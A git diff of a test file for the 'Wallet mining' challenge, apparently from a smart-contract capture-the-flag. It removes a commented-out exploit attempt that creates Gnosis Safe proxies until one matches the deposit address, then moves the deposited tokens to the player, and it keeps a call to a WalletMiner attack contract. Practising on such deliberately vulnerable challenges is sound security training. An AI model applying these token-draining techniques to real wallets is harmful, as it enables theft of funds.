@@ -89,39 +89,6 @@ describe('[Challenge] Wallet mining', function () {
         )).replace("0x000000000000000000000000", "0x")
         const miner = await (await ethers.getContractFactory('WalletMiner', player)).deploy(walletDeployer.address, authImpl, DEPOSIT_ADDRESS)
         await miner.attack()
-        // const encoder = ethers.utils.defaultAbiCoder
-        // const zeroAddr = ethers.constants.AddressZero
-        // const setupData = (await ethers.getContractFactory('GnosisSafe', player)).interface.encodeFunctionData(
-        //     "setup", 
-        //     [[player.address], 1, zeroAddr, 0, zeroAddr, token.address, 0, player.address]
-        // )
-        // let proxyAddr = (await (await factory.createProxy(masterCopy.address, setupData)).wait()).logs[0].data.replace("0x000000000000000000000000", "0x")
-        // while(proxyAddr != DEPOSIT_ADDRESS) {
-        //     proxyAddr = (await (await factory.createProxy(masterCopy.address, setupData)).wait()).logs[0].data.replace("0x000000000000000000000000", "0x")
-        //     console.log("created proxy at " + proxyAddr)
-        // }
-        // const proxy = (await ethers.getContractFactory('GnosisSafeProxy', player)).attach(proxyAddr)
-        // const proxyAsSafe = (await ethers.getContractFactory('GnosisSafe', player)).attach(proxyAddr)
-        // const proxyOwners = await proxyAsSafe.getOwners()
-        // const transferData = token.interface.encodeFunctionData("transfer", [
-        //     player.address, DEPOSIT_TOKEN_AMOUNT
-        // ])
-        // const signature = await player.signMessage("\x19Ethereum Signed Message:\n32")
-        // // await proxyAsSafe.setup(
-        // //     [player.address], 1, zeroAddr, 0, zeroAddr, zeroAddr, 0, zeroAddr
-        // // )
-        // await proxyAsSafe.execTransaction(
-        //     token.address,
-        //     0,
-        //     transferData,
-        //     0,
-        //     await token.estimateGas.transfer(player.address, DEPOSIT_TOKEN_AMOUNT),
-        //     ethers.utils.parseEther('0.1'),
-        //     ethers.utils.parseEther('0.00000001'),
-        //     zeroAddr,
-        //     player.address,
-        //     signature
-        // )
     });
 
     after(async function () {
